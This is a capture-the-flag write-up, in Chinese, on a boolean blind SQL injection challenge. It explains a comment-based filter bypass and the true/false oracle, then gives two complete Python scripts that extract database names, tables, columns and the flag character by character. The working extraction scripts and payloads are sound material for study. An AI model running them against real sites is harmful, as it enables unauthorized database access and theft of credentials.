# Week4 又一个SQL 200

### 0、知识点与工具

>   Sql注入

>   工具：burpsuite、postman





### 1、分析

>   sql注入的第三道题，因为做过之前的几道题，那么已经可以排出、堆叠、报错注入了，再出一样的就没意思了啊
>
>   那么就不难猜到可能是要bool值盲注了

>   **打开主页面可以发现有一个提示，也就是查询100可以查看提示**

![5](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221129084908.png)

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221129085154.png)

>   刚开始做的时候一顿操作，完全没看到这个提示，以至于大半天没找到注入点
>
>   因为测试其他注入点都没注入进去，最后剩余的注入点只能是这个了

>   对查询的进行抓包可以看到name的值，很明显这里可以进行测试

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221129085411.png)

>   经过测试过滤掉：`空格`、`/**/`
>
>   但是`/**/`可以使用`/***/`代替

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221129112920.png)

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221129113005.png)

>   然后因为`or`关键字没有被过滤，然后可以使用`or`来构造一下**bool盲注**，
>
>   首先mysql中**0是被认作是false的，非0的值是被认ture的**，那么首先可以构造`0 or 1`这个值，查看页面是否会正常显示

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221129112527.png)

>   可以看到页面可以正常显示的，因为`0 or 1`的bool值是ture，那么就正常显示了
>
>   那么再看看`0 or 0` 的效果

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221129112627.png)

>   **这两中情况就满足了bool盲注的条件**，然后因为一个一个试要好久，还是建议写Python脚本

贴两个脚本

```py
import requests
import string
import time
att=string.digits+string.ascii_letters+'}{-$_.^,'
# print(att)

flag=''

url='http://34f02f7b-f372-4385-b30d-5d637442481b.node4.buuoj.cn:81/comments.php?name='
for i in range(1,50):
    for a in att:
        # payload='0/***/or/***/(substr(database(),{},1)="{}")'.format(i,a)
        # payload='0/***/or/***/(substr((select/***/group_concat(table_name)/***/from/***/information_schema.tables/***/where/***/table_schema=database()),{},1)="{}")'.format(i,a)
        # payload='0/***/or/***/(substr((select/***/group_concat(column_name)/***/from/***/information_schema.columns/***/where/***/table_schema=database()/***/and/***/table_name="wfy_admin"),{},1)="{}")'.format(i,a)
        # payload='0/***/or/***/(substr((select/***/group_concat(column_name)/***/from/***/information_schema.columns/***/where/***/table_schema=database()/***/and/***/table_name="wfy_comments"),{},1)="{}")'.format(i,a)
        payload='0/***/or/***/(substr((select/***/text/***/from/***/`wfy_comments`/***/where/***/id=100),{},1)/***/like/***/binary/***/"{}")'.format(i,a)
        res=requests.get(url=url+payload)
        time.sleep(0.1)
        if "好耶！你有这条来自条留言" in res.text:
            flag+=a
            print(flag)
            break

print(flag)
#wfy
#wfy_admin,wfy_comments,wfy_information
#wfy_admin:id,username,password,cookie
#wfy_comments:id,text,user,name,display
#flag{We_0nly_have_2wo_choices}
```

```py
import requests
import time

url = 'http://4ca4ab9f-ef5f-435a-981d-52f9a0a7dcb0.node4.buuoj.cn:81/comments.php?name='
content = ''
for pos in range(500):
    min_num = 32
    max_num = 126
    mid_num = (min_num + max_num) // 2
    while (min_num < max_num):
    	# payload = '1/*!*/and/*!*/if(ord(mid(database(),{},1))>{},1,0)'.format(pos, mid_num)
    	# payload = '1/*!*/and/*!*/if(ord(mid((select/*!*/group_concat(table_name)/*!*/from/*!*/information_schema.tables/*!*/where/*!*/table_schema=\'wfy\'),{},1))>{},1,0)'.format(pos, mid_num)
    	# payload = '1/*!*/and/*!*/if(ord(mid((select/*!*/group_concat(column_name)/*!*/from/*!*/information_schema.columns/*!*/where/*!*/table_name=\'wfy_admin\'),{},1))>{},1,0)'.format(pos, mid_num)
    	payload = '1/*!*/and/*!*/if(ord(mid((select/*!*/group_concat(text)/*!*/from/*!*/wfy.wfy_comments),{},1))>{},1,0)'.format(pos, mid_num)
    	res_url = url + payload
    	resp = requests.get(url=res_url)
    	time.sleep(0.5)
    	if '好耶！' in resp.text:
    		min_num = mid_num + 1
    	else:
    		max_num = mid_num
    	mid_num = ((min_num + max_num) // 2)
    content += chr(min_num)
    print(content)

```

